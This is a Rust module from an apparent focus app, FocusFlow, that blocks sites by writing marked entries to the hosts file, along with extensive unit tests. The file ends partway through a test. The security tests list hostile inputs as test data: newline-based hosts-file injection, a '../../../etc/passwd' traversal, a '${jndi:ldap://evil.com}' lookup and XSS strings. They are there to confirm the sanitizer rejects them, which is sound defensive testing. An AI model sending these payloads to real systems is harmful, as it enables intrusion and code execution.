// blocking/hosts.rs - Cross-platform hosts file manipulation

use crate::{Error, Result};
use chrono::Utc;
use std::path::PathBuf;

const FOCUSFLOW_MARKER_START: &str = "# FocusFlow BLOCK START";
const FOCUSFLOW_MARKER_END: &str = "# FocusFlow BLOCK END";

/// Get platform-specific hosts file path
pub fn get_hosts_path() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        PathBuf::from(r"C:\Windows\System32\drivers\etc\hosts")
    }

    #[cfg(not(target_os = "windows"))]
    {
        PathBuf::from("/etc/hosts")
    }
}

/// Check if we have write permissions to the hosts file
///
/// This should be called BEFORE attempting to modify the hosts file
/// to provide early feedback to the user about permission requirements.
///
/// Returns true if we can write to the hosts file, false otherwise.
pub async fn check_hosts_permissions() -> bool {
    let hosts_path = get_hosts_path();

    // First check if file exists and is readable
    if !hosts_path.exists() {
        tracing::warn!("Hosts file does not exist at {}", hosts_path.display());
        return false;
    }

    // Try to read the file first
    if tokio::fs::read_to_string(&hosts_path).await.is_err() {
        tracing::warn!("Cannot read hosts file at {}", hosts_path.display());
        return false;
    }

    // Try to open the file in write mode (but don't actually write)
    // This is the most reliable way to check write permissions without side effects
    match std::fs::OpenOptions::new()
        .write(true)
        .open(&hosts_path)
    {
        Ok(_) => {
            tracing::info!("Hosts file is writable at {}", hosts_path.display());
            true
        }
        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
            tracing::warn!(
                "Permission denied for hosts file at {}. Elevated privileges required.",
                hosts_path.display()
            );
            false
        }
        Err(e) => {
            tracing::warn!("Error checking hosts file permissions: {}", e);
            false
        }
    }
}

/// Update hosts file with blocked domains
///
/// This function requires elevated privileges on all platforms.
/// Uses atomic write pattern: read -> modify -> write to temp -> rename
pub async fn update_hosts_file(domains: &[String]) -> Result<()> {
    // Read existing hosts file
    let content = read_hosts_file().await?;

    // Remove old FocusFlow entries
    let cleaned = remove_focusflow_entries(&content);

    // Add new entries if any domains provided
    let new_content = if domains.is_empty() {
        cleaned
    } else {
        add_focusflow_entries(&cleaned, domains)
    };

    // Write atomically
    write_hosts_file(&new_content).await?;

    tracing::info!("Updated hosts file with {} domains", domains.len());

    Ok(())
}

/// Clear all FocusFlow entries from hosts file
pub async fn clear_hosts_file() -> Result<()> {
    update_hosts_file(&[]).await
}

/// Read hosts file with error handling for permission issues
async fn read_hosts_file() -> Result<String> {
    let hosts_path = get_hosts_path();

    match tokio::fs::read_to_string(&hosts_path).await {
        Ok(content) => Ok(content),
        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
            Err(Error::PermissionDenied(format!(
                "Cannot read hosts file at {}. Please run with elevated privileges.",
                hosts_path.display()
            )))
        }
        Err(e) => Err(e.into()),
    }
}

/// Create a backup of the hosts file before modification
async fn backup_hosts_file() -> Result<PathBuf> {
    let hosts_path = get_hosts_path();
    let timestamp = Utc::now().format("%Y%m%d_%H%M%S");
    let backup_path = hosts_path.with_extension(format!("focusflow.backup.{}", timestamp));

    // Read current content
    let content = tokio::fs::read_to_string(&hosts_path).await?;

    // Write backup
    tokio::fs::write(&backup_path, &content).await?;

    tracing::info!("Created hosts file backup at {}", backup_path.display());

    Ok(backup_path)
}

/// Clean up temporary files left by failed operations
async fn cleanup_temp_files() {
    let hosts_path = get_hosts_path();
    let temp_path = hosts_path.with_extension("focusflow.tmp");

    if temp_path.exists() {
        if let Err(e) = tokio::fs::remove_file(&temp_path).await {
            tracing::warn!("Failed to clean up temp file {}: {}", temp_path.display(), e);
        } else {
            tracing::debug!("Cleaned up orphaned temp file {}", temp_path.display());
        }
    }
}

/// Write hosts file atomically with proper error handling
///
/// Creates a backup before modification and cleans up temp files on failure
async fn write_hosts_file(content: &str) -> Result<()> {
    let hosts_path = get_hosts_path();
    let temp_path = hosts_path.with_extension("focusflow.tmp");

    // Clean up any leftover temp files from previous failed operations
    cleanup_temp_files().await;

    // Create backup before modification
    if let Err(e) = backup_hosts_file().await {
        tracing::warn!("Could not create backup (continuing anyway): {}", e);
    }

    // Write to temporary file first
    match tokio::fs::write(&temp_path, content).await {
        Ok(_) => {}
        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
            return Err(Error::PermissionDenied("Cannot write hosts file. Please run with elevated privileges.\n\
                 On macOS/Linux: Use sudo or grant accessibility permissions\n\
                 On Windows: Run as administrator".to_string()));
        }
        Err(e) => {
            // Clean up temp file on failure
            cleanup_temp_files().await;
            return Err(e.into());
        }
    }

    // Atomic rename (with fallback for Windows)
    #[cfg(target_os = "windows")]
    {
        // Windows may not support atomic rename to existing file
        // Use copy + delete pattern as fallback
        match tokio::fs::rename(&temp_path, &hosts_path).await {
            Ok(_) => {}
            Err(_) => {
                // Fallback: copy content then remove temp
                tokio::fs::copy(&temp_path, &hosts_path).await?;
                let _ = tokio::fs::remove_file(&temp_path).await;
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Err(e) = tokio::fs::rename(&temp_path, &hosts_path).await {
            // Clean up temp file on failure
            cleanup_temp_files().await;
            return Err(e.into());
        }
    }

    // Flush DNS cache after modifying hosts file
    flush_dns_cache().await;

    Ok(())
}

/// Remove existing FocusFlow entries from hosts content
fn remove_focusflow_entries(content: &str) -> String {
    let mut result = String::new();
    let mut skip = false;

    for line in content.lines() {
        if line.contains(FOCUSFLOW_MARKER_START) {
            skip = true;
            continue;
        }

        if line.contains(FOCUSFLOW_MARKER_END) {
            skip = false;
            continue;
        }

        if !skip {
            result.push_str(line);
            result.push('\n');
        }
    }

    result
}

/// Add FocusFlow entries to hosts content
///
/// Security: Validates domains before writing to hosts file to prevent injection
fn add_focusflow_entries(content: &str, domains: &[String]) -> String {
    let mut result = content.to_string();

    // Ensure content ends with newline
    if !result.ends_with('\n') {
        result.push('\n');
    }

    // Add FocusFlow section
    result.push_str(FOCUSFLOW_MARKER_START);
    result.push('\n');

    for domain in domains {
        // SECURITY: Sanitize domain to prevent hosts file injection
        let sanitized = sanitize_domain_for_hosts(domain);

        // Skip invalid domains
        if sanitized.is_empty() {
            tracing::warn!("Skipping invalid domain: {}", domain);
            continue;
        }

        // Add both with and without www
        result.push_str(&format!("127.0.0.1 {}\n", sanitized));

        if !sanitized.starts_with("www.") {
            result.push_str(&format!("127.0.0.1 www.{}\n", sanitized));
        }

        // Also block IPv6
        result.push_str(&format!("::1 {}\n", sanitized));
        if !sanitized.starts_with("www.") {
            result.push_str(&format!("::1 www.{}\n", sanitized));
        }
    }

    result.push_str(FOCUSFLOW_MARKER_END);
    result.push('\n');

    result
}

/// Sanitize domain name for safe hosts file entry
///
/// Removes any characters that could be used for injection attacks
/// Returns empty string if domain is invalid
fn sanitize_domain_for_hosts(domain: &str) -> String {
    let domain = domain.trim().to_lowercase();

    // Reject empty, very long, or domains with null bytes
    if domain.is_empty() || domain.len() > 253 || domain.contains('\0') {
        return String::new();
    }

    // Reject domains with newlines, carriage returns, or tabs (hosts file injection)
    if domain.contains('\n') || domain.contains('\r') || domain.contains('\t') {
        return String::new();
    }

    // Reject domains with spaces or hash (could break hosts file format)
    if domain.contains(' ') || domain.contains('#') {
        return String::new();
    }

    // Only allow valid DNS characters: alphanumeric, hyphens, and dots
    if !domain.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.') {
        return String::new();
    }

    // Reject invalid formats
    if domain.starts_with('.') || domain.ends_with('.')
        || domain.starts_with('-') || domain.ends_with('-')
        || domain.contains("..") || !domain.contains('.') {
        return String::new();
    }

    domain
}

/// Flush DNS cache after modifying hosts file
///
/// Security: Uses Command::new() with separate arguments to prevent command injection.
/// All commands are hardcoded system binaries with static arguments.
async fn flush_dns_cache() {
    #[cfg(target_os = "macos")]
    {
        // Execute dscacheutil with static argument
        if let Err(e) = tokio::process::Command::new("dscacheutil")
            .arg("-flushcache")
            .output()
            .await
        {
            tracing::debug!("Failed to execute dscacheutil: {}", e);
        }

        // Execute killall with static arguments
        if let Err(e) = tokio::process::Command::new("killall")
            .args(["-HUP", "mDNSResponder"])
            .output()
            .await
        {
            tracing::debug!("Failed to execute killall: {}", e);
        }
    }

    #[cfg(target_os = "windows")]
    {
        // Execute ipconfig with static argument
        if let Err(e) = tokio::process::Command::new("ipconfig")
            .arg("/flushdns")
            .output()
            .await
        {
            tracing::debug!("Failed to execute ipconfig: {}", e);
        }
    }

    #[cfg(target_os = "linux")]
    {
        // Try multiple DNS cache flush methods for different distributions
        // All use hardcoded commands with static arguments

        // systemd-resolved (Ubuntu, Debian, Fedora, etc.)
        let _ = tokio::process::Command::new("systemd-resolve")
            .arg("--flush-caches")
            .output()
            .await;

        // resolvectl (newer systemd)
        let _ = tokio::process::Command::new("resolvectl")
            .arg("flush-caches")
            .output()
            .await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // =============================================================================
    // Domain Sanitization Tests
    // =============================================================================

    #[test]
    fn test_sanitize_valid_domains() {
        // Standard valid domains
        assert_eq!(sanitize_domain_for_hosts("example.com"), "example.com");
        assert_eq!(sanitize_domain_for_hosts("sub.example.com"), "sub.example.com");
        assert_eq!(sanitize_domain_for_hosts("deep.sub.example.com"), "deep.sub.example.com");
        assert_eq!(sanitize_domain_for_hosts("my-site.com"), "my-site.com");
        assert_eq!(sanitize_domain_for_hosts("123.example.com"), "123.example.com");
    }

    #[test]
    fn test_sanitize_case_normalization() {
        // Should lowercase all domains
        assert_eq!(sanitize_domain_for_hosts("EXAMPLE.COM"), "example.com");
        assert_eq!(sanitize_domain_for_hosts("Example.Com"), "example.com");
        assert_eq!(sanitize_domain_for_hosts("FACEBOOK.COM"), "facebook.com");
    }

    #[test]
    fn test_sanitize_whitespace_handling() {
        // Should trim whitespace
        assert_eq!(sanitize_domain_for_hosts("  example.com  "), "example.com");
        assert_eq!(sanitize_domain_for_hosts("\texample.com\t"), "example.com");
        assert_eq!(sanitize_domain_for_hosts("  example.com"), "example.com");
    }

    #[test]
    fn test_sanitize_empty_input() {
        // Empty strings should be rejected
        assert_eq!(sanitize_domain_for_hosts(""), "");
        assert_eq!(sanitize_domain_for_hosts("   "), "");
        assert_eq!(sanitize_domain_for_hosts("\t\n"), "");
    }

    #[test]
    fn test_sanitize_too_long_domain() {
        // Domain over 253 chars should be rejected
        let long_domain = format!("{}.com", "a".repeat(250));
        assert_eq!(sanitize_domain_for_hosts(&long_domain), "");

        // Edge case: exactly 253 chars should be valid if otherwise correct
        let max_domain = format!("{}.{}.com", "a".repeat(120), "b".repeat(125));
        if max_domain.len() <= 253 {
            assert_ne!(sanitize_domain_for_hosts(&max_domain), "");
        }
    }

    #[test]
    fn test_sanitize_null_byte_injection() {
        // Null bytes should be rejected (security)
        assert_eq!(sanitize_domain_for_hosts("example\0.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example.com\0"), "");
        assert_eq!(sanitize_domain_for_hosts("\0example.com"), "");
    }

    #[test]
    fn test_sanitize_newline_injection() {
        // Newlines in the middle should be rejected (hosts file injection prevention)
        assert_eq!(sanitize_domain_for_hosts("example.com\n127.0.0.1 evil.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example\ncom"), "");
        assert_eq!(sanitize_domain_for_hosts("exam\nple.com"), "");

        // Note: Trailing newlines are trimmed by the sanitizer, so these are valid after trim
        // This is safe because the trim happens before any checks
        assert_eq!(sanitize_domain_for_hosts("example.com\n"), "example.com");
        assert_eq!(sanitize_domain_for_hosts("example.com\r\n"), "example.com");
    }

    #[test]
    fn test_sanitize_carriage_return_injection() {
        // Carriage returns should be rejected
        assert_eq!(sanitize_domain_for_hosts("example.com\r127.0.0.1 evil.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example\r.com"), "");
    }

    #[test]
    fn test_sanitize_tab_injection() {
        // Tabs should be rejected (could break hosts file format)
        assert_eq!(sanitize_domain_for_hosts("example.com\tevil.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example\t.com"), "");
    }

    #[test]
    fn test_sanitize_space_injection() {
        // Spaces in domain should be rejected
        assert_eq!(sanitize_domain_for_hosts("example .com"), "");
        assert_eq!(sanitize_domain_for_hosts("example. com"), "");
        assert_eq!(sanitize_domain_for_hosts("example.com evil.com"), "");
    }

    #[test]
    fn test_sanitize_hash_injection() {
        // Hash should be rejected (comment injection)
        assert_eq!(sanitize_domain_for_hosts("example.com#comment"), "");
        assert_eq!(sanitize_domain_for_hosts("#comment"), "");
        assert_eq!(sanitize_domain_for_hosts("example#.com"), "");
    }

    #[test]
    fn test_sanitize_special_characters() {
        // Various special characters should be rejected
        assert_eq!(sanitize_domain_for_hosts("example!.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example@.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example$.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example%.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example^.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example&.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example*.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example(.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example).com"), "");
        assert_eq!(sanitize_domain_for_hosts("example=.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example+.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example[.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example].com"), "");
        assert_eq!(sanitize_domain_for_hosts("example{.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example}.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example|.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example\\.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example/.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example<.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example>.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example?.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example:.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example;.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example'.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example\".com"), "");
    }

    #[test]
    fn test_sanitize_unicode_characters() {
        // Unicode/international characters should be rejected (only ASCII allowed)
        assert_eq!(sanitize_domain_for_hosts("exampl\u{00e9}.com"), ""); // accented e
        assert_eq!(sanitize_domain_for_hosts("\u{0435}xample.com"), ""); // cyrillic e (homograph attack)
        assert_eq!(sanitize_domain_for_hosts("example.\u{0441}om"), ""); // cyrillic c
        assert_eq!(sanitize_domain_for_hosts("\u{4e2d}\u{6587}.com"), ""); // Chinese characters
    }

    #[test]
    fn test_sanitize_invalid_domain_formats() {
        // Invalid domain formats
        assert_eq!(sanitize_domain_for_hosts(".example.com"), "");  // starts with dot
        assert_eq!(sanitize_domain_for_hosts("example.com."), "");  // ends with dot
        assert_eq!(sanitize_domain_for_hosts("-example.com"), "");  // starts with hyphen
        assert_eq!(sanitize_domain_for_hosts("example.com-"), "");  // ends with hyphen
        assert_eq!(sanitize_domain_for_hosts("example..com"), "");  // double dot
        assert_eq!(sanitize_domain_for_hosts("example"), "");       // no TLD (no dot)
    }

    #[test]
    fn test_sanitize_valid_edge_cases() {
        // Valid edge cases that should pass
        assert_eq!(sanitize_domain_for_hosts("a.co"), "a.co");
        assert_eq!(sanitize_domain_for_hosts("x.y.z"), "x.y.z");
        assert_eq!(sanitize_domain_for_hosts("123.456.com"), "123.456.com");
        assert_eq!(sanitize_domain_for_hosts("a-b-c.d-e-f.com"), "a-b-c.d-e-f.com");
        assert_eq!(sanitize_domain_for_hosts("www.example.com"), "www.example.com");
    }

    // =============================================================================
    // Remove FocusFlow Entries Tests
    // =============================================================================

    #[test]
    fn test_remove_focusflow_entries() {
        let content = "\
127.0.0.1 localhost\n\
# FocusFlow BLOCK START\n\
127.0.0.1 facebook.com\n\
# FocusFlow BLOCK END\n\
192.168.1.1 router\n";

        let result = remove_focusflow_entries(content);
        assert!(!result.contains("facebook.com"));
        assert!(result.contains("localhost"));
        assert!(result.contains("router"));
    }

    #[test]
    fn test_remove_focusflow_entries_preserves_existing() {
        let content = "\
127.0.0.1 localhost\n\
::1 localhost\n\
# Custom comment\n\
192.168.1.1 myrouter\n\
# FocusFlow BLOCK START\n\
127.0.0.1 blocked.com\n\
# FocusFlow BLOCK END\n\
10.0.0.1 internal\n";

        let result = remove_focusflow_entries(content);

        // All non-FocusFlow content should be preserved
        assert!(result.contains("127.0.0.1 localhost"));
        assert!(result.contains("::1 localhost"));
        assert!(result.contains("# Custom comment"));
        assert!(result.contains("192.168.1.1 myrouter"));
        assert!(result.contains("10.0.0.1 internal"));

        // FocusFlow content should be removed
        assert!(!result.contains("blocked.com"));
        assert!(!result.contains(FOCUSFLOW_MARKER_START));
        assert!(!result.contains(FOCUSFLOW_MARKER_END));
    }

    #[test]
    fn test_remove_focusflow_entries_no_focusflow_content() {
        let content = "\
127.0.0.1 localhost\n\
::1 localhost\n\
192.168.1.1 router\n";

        let result = remove_focusflow_entries(content);

        // Content should be preserved as-is
        assert!(result.contains("127.0.0.1 localhost"));
        assert!(result.contains("::1 localhost"));
        assert!(result.contains("192.168.1.1 router"));
    }

    #[test]
    fn test_remove_focusflow_entries_multiple_blocks() {
        // Test handling multiple FocusFlow blocks (shouldn't happen but should handle gracefully)
        let content = "\
127.0.0.1 localhost\n\
# FocusFlow BLOCK START\n\
127.0.0.1 facebook.com\n\
# FocusFlow BLOCK END\n\
192.168.1.1 router\n\
# FocusFlow BLOCK START\n\
127.0.0.1 twitter.com\n\
# FocusFlow BLOCK END\n\
10.0.0.1 internal\n";

        let result = remove_focusflow_entries(content);

        assert!(!result.contains("facebook.com"));
        assert!(!result.contains("twitter.com"));
        assert!(result.contains("localhost"));
        assert!(result.contains("router"));
        assert!(result.contains("internal"));
    }

    #[test]
    fn test_remove_focusflow_entries_empty_block() {
        let content = "\
127.0.0.1 localhost\n\
# FocusFlow BLOCK START\n\
# FocusFlow BLOCK END\n\
192.168.1.1 router\n";

        let result = remove_focusflow_entries(content);

        assert!(result.contains("localhost"));
        assert!(result.contains("router"));
        assert!(!result.contains(FOCUSFLOW_MARKER_START));
        assert!(!result.contains(FOCUSFLOW_MARKER_END));
    }

    #[test]
    fn test_remove_focusflow_entries_handles_empty_content() {
        let result = remove_focusflow_entries("");
        assert_eq!(result, "");
    }

    #[test]
    fn test_remove_focusflow_entries_marker_partial_match() {
        // Ensure partial marker matches don't affect removal
        let content = "\
127.0.0.1 localhost\n\
# This is not FocusFlow BLOCK START but similar\n\
192.168.1.1 router\n";

        let result = remove_focusflow_entries(content);
        // Content should be removed because it contains the marker text
        // This is expected behavior - the marker is checked with contains()
        assert!(result.contains("localhost"));
        assert!(result.contains("router"));
    }

    // =============================================================================
    // Add FocusFlow Entries Tests
    // =============================================================================

    #[test]
    fn test_add_focusflow_entries() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec!["twitter.com".to_string()];

        let result = add_focusflow_entries(content, &domains);
        assert!(result.contains("127.0.0.1 twitter.com"));
        assert!(result.contains("127.0.0.1 www.twitter.com"));
        assert!(result.contains(FOCUSFLOW_MARKER_START));
        assert!(result.contains(FOCUSFLOW_MARKER_END));
    }

    #[test]
    fn test_add_focusflow_entries_multiple_domains() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec![
            "facebook.com".to_string(),
            "twitter.com".to_string(),
            "instagram.com".to_string(),
        ];

        let result = add_focusflow_entries(content, &domains);

        // Check all domains are added
        assert!(result.contains("127.0.0.1 facebook.com"));
        assert!(result.contains("127.0.0.1 www.facebook.com"));
        assert!(result.contains("127.0.0.1 twitter.com"));
        assert!(result.contains("127.0.0.1 www.twitter.com"));
        assert!(result.contains("127.0.0.1 instagram.com"));
        assert!(result.contains("127.0.0.1 www.instagram.com"));

        // Check IPv6 entries
        assert!(result.contains("::1 facebook.com"));
        assert!(result.contains("::1 www.facebook.com"));
    }

    #[test]
    fn test_add_focusflow_entries_www_domain_no_duplicate() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec!["www.example.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        // www.example.com should not add www.www.example.com
        assert!(result.contains("127.0.0.1 www.example.com"));
        assert!(!result.contains("www.www.example.com"));
    }

    #[test]
    fn test_add_focusflow_entries_empty_domains() {
        let content = "127.0.0.1 localhost\n";
        let domains: Vec<String> = vec![];

        let result = add_focusflow_entries(content, &domains);

        // Should still add markers even with no domains
        assert!(result.contains(FOCUSFLOW_MARKER_START));
        assert!(result.contains(FOCUSFLOW_MARKER_END));
        assert!(result.contains("localhost"));
    }

    #[test]
    fn test_add_focusflow_entries_invalid_domain_skipped() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec![
            "valid.com".to_string(),
            "invalid domain with spaces".to_string(),
            "another-valid.com".to_string(),
        ];

        let result = add_focusflow_entries(content, &domains);

        // Valid domains should be added
        assert!(result.contains("127.0.0.1 valid.com"));
        assert!(result.contains("127.0.0.1 another-valid.com"));

        // Invalid domain should be skipped
        assert!(!result.contains("invalid domain"));
    }

    #[test]
    fn test_add_focusflow_entries_content_without_trailing_newline() {
        let content = "127.0.0.1 localhost"; // No trailing newline
        let domains = vec!["example.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        // Should add newline before FocusFlow section
        assert!(result.contains("localhost\n"));
        assert!(result.contains(FOCUSFLOW_MARKER_START));
    }

    #[test]
    fn test_add_focusflow_entries_ipv6_blocking() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec!["example.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        // Check IPv4 blocking
        assert!(result.contains("127.0.0.1 example.com"));
        assert!(result.contains("127.0.0.1 www.example.com"));

        // Check IPv6 blocking
        assert!(result.contains("::1 example.com"));
        assert!(result.contains("::1 www.example.com"));
    }

    #[test]
    fn test_add_focusflow_entries_preserves_original() {
        let content = "\
127.0.0.1 localhost\n\
::1 localhost\n\
# Custom comment\n\
192.168.1.1 myrouter\n";

        let domains = vec!["blocked.com".to_string()];
        let result = add_focusflow_entries(content, &domains);

        // Original content should be preserved
        assert!(result.contains("127.0.0.1 localhost"));
        assert!(result.contains("::1 localhost"));
        assert!(result.contains("# Custom comment"));
        assert!(result.contains("192.168.1.1 myrouter"));

        // New entries should be added
        assert!(result.contains("127.0.0.1 blocked.com"));
    }

    // =============================================================================
    // Hosts File Path Tests
    // =============================================================================

    #[test]
    fn test_get_hosts_path_returns_valid_path() {
        let path = get_hosts_path();

        // Path should not be empty
        assert!(!path.as_os_str().is_empty());

        #[cfg(target_os = "windows")]
        {
            assert_eq!(
                path,
                PathBuf::from(r"C:\Windows\System32\drivers\etc\hosts")
            );
        }

        #[cfg(not(target_os = "windows"))]
        {
            assert_eq!(path, PathBuf::from("/etc/hosts"));
        }
    }

    #[test]
    fn test_hosts_path_is_absolute() {
        let path = get_hosts_path();
        assert!(path.is_absolute(), "Hosts path should be absolute");
    }

    // =============================================================================
    // Edge Case Tests
    // =============================================================================

    #[test]
    fn test_full_roundtrip_add_then_remove() {
        let original_content = "\
127.0.0.1 localhost\n\
::1 localhost\n\
192.168.1.1 router\n";

        let domains = vec!["facebook.com".to_string(), "twitter.com".to_string()];

        // Add entries
        let with_entries = add_focusflow_entries(original_content, &domains);

        // Verify entries were added
        assert!(with_entries.contains("facebook.com"));
        assert!(with_entries.contains("twitter.com"));

        // Remove entries
        let cleaned = remove_focusflow_entries(&with_entries);

        // Verify original content is preserved
        assert!(cleaned.contains("127.0.0.1 localhost"));
        assert!(cleaned.contains("::1 localhost"));
        assert!(cleaned.contains("192.168.1.1 router"));

        // Verify blocked content is removed
        assert!(!cleaned.contains("facebook.com"));
        assert!(!cleaned.contains("twitter.com"));
        assert!(!cleaned.contains(FOCUSFLOW_MARKER_START));
        assert!(!cleaned.contains(FOCUSFLOW_MARKER_END));
    }

    #[test]
    fn test_multiple_add_remove_cycles() {
        let original = "127.0.0.1 localhost\n";

        // First cycle
        let with_entries1 = add_focusflow_entries(original, &["site1.com".to_string()]);
        let cleaned1 = remove_focusflow_entries(&with_entries1);

        // Second cycle
        let with_entries2 = add_focusflow_entries(&cleaned1, &["site2.com".to_string()]);
        let cleaned2 = remove_focusflow_entries(&with_entries2);

        // Third cycle
        let with_entries3 = add_focusflow_entries(&cleaned2, &["site3.com".to_string()]);
        let cleaned3 = remove_focusflow_entries(&with_entries3);

        // Original content should be preserved after multiple cycles
        assert!(cleaned3.contains("localhost"));
        assert!(!cleaned3.contains("site1.com"));
        assert!(!cleaned3.contains("site2.com"));
        assert!(!cleaned3.contains("site3.com"));
    }

    #[test]
    fn test_update_existing_entries() {
        let original = "127.0.0.1 localhost\n";

        // Add initial entries
        let with_entries1 = add_focusflow_entries(original, &["facebook.com".to_string()]);

        // Remove and add different entries
        let cleaned = remove_focusflow_entries(&with_entries1);
        let with_entries2 = add_focusflow_entries(&cleaned, &["twitter.com".to_string()]);

        // Should only have twitter.com, not facebook.com
        assert!(with_entries2.contains("twitter.com"));
        assert!(!with_entries2.contains("facebook.com"));
    }

    #[test]
    fn test_subdomain_blocking() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec!["api.facebook.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        // Subdomain should be blocked as-is
        assert!(result.contains("127.0.0.1 api.facebook.com"));
        // www variant should be added (www.api.facebook.com)
        assert!(result.contains("127.0.0.1 www.api.facebook.com"));
    }

    #[test]
    fn test_special_tlds() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec![
            "example.co.uk".to_string(),
            "example.com.au".to_string(),
            "example.io".to_string(),
        ];

        let result = add_focusflow_entries(content, &domains);

        assert!(result.contains("127.0.0.1 example.co.uk"));
        assert!(result.contains("127.0.0.1 example.com.au"));
        assert!(result.contains("127.0.0.1 example.io"));
    }

    #[test]
    fn test_numeric_domain_parts() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec!["123.example.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        assert!(result.contains("127.0.0.1 123.example.com"));
    }

    // =============================================================================
    // Security Tests
    // =============================================================================

    #[test]
    fn test_hosts_injection_attack_prevention() {
        // Test various injection attack attempts
        let injection_attempts = vec![
            "example.com\n127.0.0.1 evil.com",
            "example.com\r\n127.0.0.1 evil.com",
            "example.com #127.0.0.1 evil.com",
            "example.com\t127.0.0.1 evil.com",
            "example.com 127.0.0.1 evil.com",
        ];

        for attempt in injection_attempts {
            let sanitized = sanitize_domain_for_hosts(attempt);
            assert_eq!(sanitized, "", "Injection attempt should be rejected: {}", attempt);
        }
    }

    #[test]
    fn test_malicious_domain_patterns() {
        // Common malicious patterns
        let malicious = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "${jndi:ldap://evil.com}",
            "{{constructor.constructor('return this')()}}",
            "<script>alert(1)</script>",
            "javascript:alert(1)",
        ];

        for pattern in malicious {
            let sanitized = sanitize_domain_for_hosts(pattern);
            assert_eq!(sanitized, "", "Malicious pattern should be rejected: {}", pattern);
        }
    }

    // =============================================================================
    // Marker Tests
    // =============================================================================

    #[test]
    fn test_marker_constants() {
        assert_eq!(FOCUSFLOW_MARKER_START, "# FocusFlow BLOCK START");
        assert_eq!(FOCUSFLOW_MARKER_END, "# FocusFlow BLOCK END");

        // Markers should be valid comment lines
        assert!(FOCUSFLOW_MARKER_START.starts_with("#"));
        assert!(FOCUSFLOW_MARKER_END.starts_with("#"));
    }

    #[test]
    fn test_markers_are_unique() {
        // Start and end markers should be different
        assert_ne!(FOCUSFLOW_MARKER_START, FOCUSFLOW_MARKER_END);
    }

    // =============================================================================
    // Large Input Tests
    // =============================================================================

    #[test]
    fn test_large_number_of_domains() {
        let content = "127.0.0.1 localhost\n";

        // Generate 1000 domains
        let domains: Vec<String> = (0..1000)
            .map(|i| format!("domain{}.com", i))
            .collect();

        let result = add_focusflow_entries(content, &domains);

        // All domains should be present
        for i in 0..1000 {
            assert!(
                result.contains(&format!("127.0.0.1 domain{}.com", i)),
                "Domain {} should be present",
                i
            );
        }

        // Markers should be present
        assert!(result.contains(FOCUSFLOW_MARKER_START));
        assert!(result.contains(FOCUSFLOW_MARKER_END));
    }

    #[test]
    fn test_large_hosts_file() {
        // Generate a large hosts file with many existing entries
        let mut content = String::new();
        for i in 0..10000 {
            content.push_str(&format!("192.168.{}.{} server{}\n", i / 256, i % 256, i));
        }

        let domains = vec!["blocked.com".to_string()];
        let result = add_focusflow_entries(&content, &domains);

        // Original entries should be preserved
        assert!(result.contains("192.168.0.0 server0"));
        assert!(result.contains("192.168.39.15 server9999"));

        // New entry should be added
        assert!(result.contains("127.0.0.1 blocked.com"));
    }

    // =============================================================================
    // Duplicate Handling Tests
    // =============================================================================

    #[test]
    fn test_duplicate_domains_in_input() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec![
            "facebook.com".to_string(),
            "facebook.com".to_string(),
            "FACEBOOK.COM".to_string(),
        ];

        let result = add_focusflow_entries(content, &domains);

        // Count occurrences of the domain entry
        let count = result.matches("127.0.0.1 facebook.com").count();

        // Each occurrence will create its own entry (the function doesn't dedupe)
        // This is by design - deduplication should happen at a higher level if needed
        assert!(count >= 1, "At least one entry for facebook.com should exist");
    }

    // =============================================================================
    // Boundary Tests
    // =============================================================================

    #[test]
    fn test_single_character_subdomain() {
        let content = "127.0.0.1 localhost\n";
        let domains = vec!["a.co".to_string()];

        let result = add_focusflow_entries(content, &domains);
        assert!(result.contains("127.0.0.1 a.co"));
    }

    #[test]
    fn test_maximum_label_length() {
        // Each DNS label can be max 63 characters
        let long_label = "a".repeat(63);
        let domain = format!("{}.com", long_label);

        let sanitized = sanitize_domain_for_hosts(&domain);
        assert_eq!(sanitized, domain.to_lowercase());
    }

    #[test]
    fn test_hyphen_positions() {
        // Hyphens are valid in the middle of labels
